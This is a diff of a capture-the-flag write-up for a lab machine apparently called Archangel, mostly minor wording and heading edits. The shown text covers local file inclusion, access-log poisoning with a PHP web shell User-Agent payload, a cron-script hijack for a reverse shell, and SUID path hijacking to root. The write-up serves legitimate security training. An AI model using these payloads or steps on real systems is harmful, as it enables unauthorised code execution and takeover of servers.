@@ -73,6 +73,8 @@ Visiting the main page:
 
 This gives us the answer to the **first** objective: **Find a different hostname**:
 
+<br>
+
 ![](images/archangel2.png)
 
 <br>
@@ -85,7 +87,7 @@ Prepare to meet our good friend Rick:
 
 <br>
 
-None of the other links provide anything useful so I go and add the following to my **/etc/hosts**
+None of the other links provide anything useful so I go and add the following to my **/etc/hosts**:
 
 ```
 10.10.56.122	mafialive.thm
@@ -154,7 +156,7 @@ Decoding that base64 via:  `echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbi
 
 Nothing there, let's look at **test.php**. After decoding the base64:
 
-```html
+```php
 <!DOCTYPE HTML>
 <html>
 
@@ -214,9 +216,9 @@ And sending a request like that over via burp:
 
 <br>
 
-And that worked perfectly! We can see that besides root there is only the **archangel** user on the system. I check to see if that user has a **ssh** key sitting around in their home directory and unfortunately they do not.
+And that worked perfectly! We can see that besides root there is only the **archangel** user on the system. I check to see if that user has an **ssh** key sitting around in their home directory and unfortunately they do not.
 
-I check to see if the **/var/log/apache2/access.log** file is viewable and it is:
+In burp I check to see if the **/var/log/apache2/access.log** file is viewable and it is:
 
 ```
 10.6.127.197 - - [23/Feb/2022:21:25:16 +0530] "GET /test.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
@@ -226,7 +228,7 @@ I check to see if the **/var/log/apache2/access.log** file is viewable and it is
 10.6.127.197 - - [23/Feb/2022:21:27:33 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 449 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ```
 
-I check to see if I can use **log poisioning** to gain code execution and it works. To do this intercept a request in burp, change your user agent to the following:
+I then check to see if I can use **log poisioning** to gain code execution and it works. To do this intercept a request in burp and change your user agent to the following:
 
 ```
 User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Firefox/91.0
@@ -293,7 +295,7 @@ Looking in the **helloworld.sh** script:
 echo "hello world" >> /opt/backupfiles/helloworld.txt
 ```
 
-We have the ability to modify this script however we wish but will not have access to execute it since it sends a file into **backupfiles** and we can't access that. I check to see if this script is ran through **cron** and it is, so we should be able to easily escalate over to the **archangel** user:
+We have the ability to modify this script however we wish and looking at **/etc/crontab** shows that it automatically runs once per minute:
 
 `cat /etc/crontab`
 
@@ -302,7 +304,7 @@ We have the ability to modify this script however we wish but will not have acce
 */1 *   * * *   archangel /opt/helloworld.sh
 ```
 
-So it runs every minute and we just need to modify the script to connect back to a listener on our system. I change it to this:
+We just need to modify the script to connect back to a listener on our system. I change it to this:
 
 ```
 #!/bin/bash
@@ -322,13 +324,7 @@ whoami
 archangel
 ```
 
-<br>
-
-## Root
-
-<br>
-
-Now let's check out that **secret** directory in their home directory that we couldn't access before:
+Now let's check out that **secret** directory in the home directory that we couldn't access before:
 
 ```
 drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
@@ -339,9 +335,13 @@ drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
 
 Opening up **user2.txt** gives us the answer to the **sixth** objective: **Get User 2 flag**
 
+<br>
+
+## Root
+
 The **backup** program is set to **SUID** and will run as root, so that's our likely escalation path.
 
-`strings backup`
+It's an executable binary file so I examine it with `strings backup` and find that it runs the following command:
 
 ```
 cp /home/user/archangel/myfiles/* /opt/backupfiles
@@ -378,6 +378,8 @@ root
 
 Changing over to **/root** and looking at **root.txt** gives us our final objective.
 
+With that we've completed this CTF!
+
 <br>
 
 ![](images/archangel10.png)
@@ -389,11 +391,11 @@ Changing over to **/root** and looking at **root.txt** gives us our final object
 A quick run down of what we covered in this CTF:
 
 - Basic enumeration with **nmap** and **gobuster**
-- Using a **php filter** to convert a .php file to base64 so we can view it
-- Examining php code to learn how to bypass the built in LFI filter
+- Using a **php filter** to convert a .php file to base64 so we can view it through the web browser
+- Examining php code to learn how to **bypass the LFI filter**
 - Using **LFI** to probe the system for weaknesses
-- **Log poisoning** an Apache2 server using **burp**
-- Modifying a bash script that runs as another user via **cron** to laterally escalate privileges by exploiting the path variable to obtain a reverse shell
+- **Log poisoning** an Apache2 servers **access.log** file using **burp**
+- Modifying a bash script that runs as another user via **cron** to move laterally
 - Examining a **SUID** bit program that runs as root and finding that a command it calls didn't have an absolute path set. This allowed us to create our own command of the same name to escalate to root.
 
 <br>
